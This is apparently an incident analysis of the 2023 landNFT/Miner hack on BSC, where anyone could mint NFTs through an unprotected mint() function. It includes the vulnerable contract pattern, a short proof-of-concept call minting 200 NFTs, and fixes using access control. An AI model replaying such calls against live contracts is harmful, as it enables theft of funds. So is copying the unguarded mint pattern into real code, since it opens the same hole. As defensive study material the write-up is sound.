# landNFT — Unlimited NFT Mint Authorization Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-16 |
| **Protocol** | landNFT / Miner |
| **Chain** | BSC |
| **Loss** | 200 landNFT → 28,601 XQJ → 149,616 BUSD |
| **Attacker** | Unknown |
| **Attack Tx** | [0xe4db1550...](https://bscscan.com/tx/0xe4db1550e3aa78a05e93bfd8fbe21b6eba5cce50dc06688949ab479ebed18048) |
| **Vulnerable Contract** | [0x2e599883...](https://bscscan.com/address/0x2e599883715D2f92468Fa5ae3F9aab4E930E3aC7) |
| **Root Cause** | No authorization check in the `mint()` function of the Miner contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/landNFT_exp.sol) |

---
## 1. Vulnerability Overview

The Miner contract of the landNFT project exposes a `mint(address[] memory to, uint256[] memory value)` function for minting NFTs. This function contains no caller authorization checks whatsoever, allowing anyone to mint an arbitrary quantity of NFTs to any address. The attacker exploited this to freely mint 200 landNFTs, then exchanged them for XQJ tokens, ultimately profiting 149,616 BUSD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ mint function with no authorization check
interface IMiner {
    // ❌ Callable by anyone — no onlyOwner, onlyMinter, etc.
    function mint(address[] memory to, uint256[] memory value) external;
}

// Estimated implementation
contract Miner {
    IERC721 public landNFT;

    // ❌ No access control
    function mint(address[] memory to, uint256[] memory value) external {
        for (uint256 i = 0; i < to.length; i++) {
            // ❌ Mints arbitrary quantities without caller verification
            for (uint256 j = 0; j < value[i]; j++) {
                landNFT.mint(to[i]);
            }
        }
    }
}
```

```solidity
// ✅ Fix: add access control
contract Miner is Ownable {
    mapping(address => bool) public isMinter;

    modifier onlyMinter() {
        require(isMinter[msg.sender], "Not authorized minter");
        _;
    }

    // ✅ Only authorized addresses can call
    function mint(address[] memory to, uint256[] memory value) external onlyMinter {
        for (uint256 i = 0; i < to.length; i++) {
            for (uint256 j = 0; j < value[i]; j++) {
                landNFT.mint(to[i]);
            }
        }
    }
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// File: landNFT_decompiled.sol
    function mint(address[] param0, uint256[] param1) external {}  // ❌
```

## 3. Attack Flow

```
┌─────────────────────────────────────────────┐
│  1. minerContract.mint([attacker], [200])    │
│     → No authorization check → 200 landNFT  │
│       obtained for free                      │
└─────────────────────┬───────────────────────┘
                      ▼
┌─────────────────────────────────────────────┐
│  2. 200 landNFT → XQJ token swap            │
│     (28,601 XQJ received)                    │
└─────────────────────┬───────────────────────┘
                      ▼
┌─────────────────────────────────────────────┐
│  3. XQJ → BUSD sell                         │
│     (149,616 BUSD received)                  │
└─────────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() public {
    // Check NFT balance before attack
    emit log_named_uint("NFT balance before attack", landNFT.balanceOf(address(this)));

    // 1. Mint 200 NFTs without authorization
    address[] memory to = new address[](1);
    to[0] = address(this);
    uint256[] memory amount = new uint256[](1);
    amount[0] = 200;
    // ❌ No authorization check → succeeds
    minerContract.mint(to, amount);

    // Check NFT balance after attack
    emit log_named_uint("NFT balance after attack", landNFT.balanceOf(address(this)));
    // → 200 NFTs obtained

    // 2. Swap NFTs for XQJ tokens (calls separate contract)
    // 3. Sell XQJ → BUSD for 149,616 BUSD profit
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Unlimited Mint (Missing Access Control) | CRITICAL | CWE-284 | 03_access_control.md |
| V-02 | NFT Price Manipulation | HIGH | CWE-682 | 13_nft_vulnerabilities.md |

### V-01: Unlimited NFT Mint
- **Description**: The `mint()` function has no access control such as `onlyOwner` or `onlyMinter`, allowing anyone to call it
- **Impact**: Arbitrary quantities of NFTs can be minted for free and sold on the market, causing a collapse in the protocol token's value
- **Attack Condition**: Only requires calling a public function (no flash loan needed)

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ Use OpenZeppelin AccessControl
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Miner is AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    function mint(address[] memory to, uint256[] memory value)
        external
        onlyRole(MINTER_ROLE)  // ✅ Authorization check
    {
        // ... mint logic
    }
}
```

### Structural Improvements
| Vulnerability | Recommended Action |
|--------|-----------|
| Unlimited mint | MINTER_ROLE access control |
| Bulk minting | Cap maximum mint quantity per transaction |
| NFT pricing | Require BUSD payment at mint time |

## 7. Lessons Learned

1. NFT mint functions must enforce strict access control. A `public` mint function is the most direct attack vector for destroying a game economy.
2. Even without a flash loan, a simple function call alone can cause hundreds of thousands of dollars in damage.
3. Where an NFT-to-token exchange mechanism exists, controlling NFT supply becomes the critical security point for the entire token economy.